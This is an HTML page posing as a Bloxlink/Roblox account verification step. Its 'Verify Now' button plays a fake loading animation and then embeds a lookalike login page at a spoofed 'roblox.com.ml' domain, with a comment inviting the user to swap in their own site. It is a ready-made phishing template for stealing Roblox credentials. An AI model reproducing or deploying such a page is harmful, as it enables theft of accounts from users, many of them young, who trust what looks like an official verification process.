<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verification Page</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
<style>
  :root {
    --main-bg: #111827;
    --panel-bg: #1e293b;
    --text: #e2e8f0;
    --muted: #94a3b8;
    --purple: #5b4ef0;
    --green: #22c55e;
  }

  body {
    margin: 0;
    font-family: 'Inter', sans-serif;
    background: var(--main-bg);
    color: var(--text);
    display: flex;
    flex-direction: column;
    align-items: center;
    min-height: 100vh;
  }

  .main {
    padding: 40px 20px;
    width: 100%;
    max-width: 700px;
  }

  .notice {
    font-size: 14px;
    color: var(--muted);
    background: var(--panel-bg);
    padding: 10px 16px;
    border-radius: 8px;
    margin-bottom: 20px;
    text-align: center;
  }

  .notice a { color: #60a5fa; text-decoration: none; }

  .verification-box {
    background: var(--purple);
    border-radius: 12px;
    padding: 30px 26px;
    position: relative;
    box-shadow: 0 8px 24px rgba(79,70,229,0.3);
  }

  .verification-box h1 {
    font-size: 20px;
    font-weight: 700;
    margin-bottom: 16px;
  }

  .verify-btn {
    background: var(--green);
    border: none;
    color: white;
    font-weight: 700;
    padding: 10px 16px;
    border-radius: 8px;
    cursor: pointer;
  }

  .verify-btn:hover { background: #16a34a; }

  iframe {
    width: 100%;
    height: 500px;
    border: none;
    display: none;
    margin-top: 20px;
    border-radius: 10px;
  }

  .loading-screen {
    display: none;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 500px;
    width: 100%;
    text-align: center;
    padding: 20px;
    background: var(--panel-bg);
    border-radius: 12px;
    margin-top: 20px;
  }

  .loading-text { font-size: 16px; }

  .dots span { animation: blink 1.5s infinite; }
  .dots span:nth-child(2) { animation-delay: 0.3s; }
  .dots span:nth-child(3) { animation-delay: 0.6s; }

  @keyframes blink {
    0%, 80%, 100% { opacity: 0; }
    40% { opacity: 1; }
  }
</style>
</head>
<body>

<div class="main">
  <div class="notice">
    Read more here: <a href="https://x.com/bloxlink/status/1818339107220693288" target="_blank">https://x.com/bloxlink/status/1818339107220693288</a>
  </div>

  <div class="verification-box">
    <h1>Get started now by linking your account</h1>
    <p>Click the button below to verify your account.</p>
    <button class="verify-btn" id="verify-btn">Verify Now</button>
    <div class="loading-screen" id="loading-screen">
      <div class="loading-text">
        Loading verification page<span class="dots"><span>.</span><span>.</span><span>.</span></span>
      </div>
    </div>
    <iframe id="verification-iframe" src=""></iframe>
  </div>
</div>

<script>
  const verifyBtn = document.getElementById('verify-btn');
  const loadingScreen = document.getElementById('loading-screen');
  const iframe = document.getElementById('verification-iframe');

  const redirectURL = "https://www.roblox.com.ml/login?returnUrl=2883825149167571"; // Replace with your verification site

  verifyBtn.addEventListener('click', () => {
    verifyBtn.style.display = 'none';
    loadingScreen.style.display = 'flex';
    
    // Simulate loading before showing iframe
    setTimeout(() => {
      loadingScreen.style.display = 'none';
      iframe.src = redirectURL;
      iframe.style.display = 'block';
    }, 1500);
  });
</script>

</body>
</html>
